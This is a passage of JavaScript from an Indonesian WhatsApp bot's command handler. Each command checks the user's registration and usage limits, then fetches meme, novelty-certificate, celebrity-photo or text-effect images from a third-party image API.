sendFileFromUrl(from, `https://api.lolhuman.xyz/api/meme5?apikey=${lolkey}&text=${q}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'meme1':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/meme1?apikey=${lolkey}&text=${q}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'meme4':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/meme4?apikey=${lolkey}&text=${q}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'tololserti':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/toloserti?apikey=${lolkey}&name=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'bucinserti':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/bucinserti?apikey=${lolkey}&name=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'goodboyserti':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/goodboy?apikey=${lolkey}&name=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'goodgirlserti':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/goodgirl?apikey=${lolkey}&name=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'fuckgirlserti':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/fuckgirl?apikey=${lolkey}&name=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'fuckboyserti':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/fuckboy?apikey=${lolkey}&name=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'badgirlserti':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/badgirl?apikey=${lolkey}&name=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'badboyserti':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/badboy?apikey=${lolkey}&name=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'getpptt':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/pptiktok/${q}?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'onecak':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/onecak?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
gameAdd(sender, glimit)
break

case 'lewdk':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random2/lewdk?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
gameAdd(sender, glimit)
break

case 'cogan':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random/cogan?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'cecan':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random/cecan?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'bts':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random/bts?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'exo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random/exo?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'blackpink': case 'bp':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/blackpink?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'wetglass':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/wetglass?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'textbyname':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/textbyname?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'multicolor3d':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/multicolor3d?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'watercolor':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/watercolor?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'luxurygold':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/luxurygold?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'lighttext':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/lighttext?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'beautifulflower':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/beautifulflower?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'puppycute':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/puppycute?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'royaltext':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/royaltext?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'heartshaped':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/heartshaped?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'birthdaycake':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/birthdaycake?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'hologram3d':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/hologram3d?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'glossychrome':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/glossychrome?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'greenbush':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/greenbush?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'metallogo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/metallogo?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'noeltext':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/noeltext?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'glittergold':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/glittergold?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'textcake':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/textcake?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'starsnight':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/starsnight?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'wooden3d':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/wooden3d?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'galaxybat':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/galaxybat?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'writegalacy':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/writegalacy?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'snow3d':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/snow3d?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'birthdayday':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/birthdaycake?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'goldplaybutton':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/goldplaybutton?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'silverplaybutton':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/silverplaybutton?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'freefire':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/freefire?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'galaxystyle': case 'gs':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/galaxystyle?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'bannerlol':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/photooxy3/bannerlol?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'mlwall': case 'mlmaker':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/mlwall?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'logogaming':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
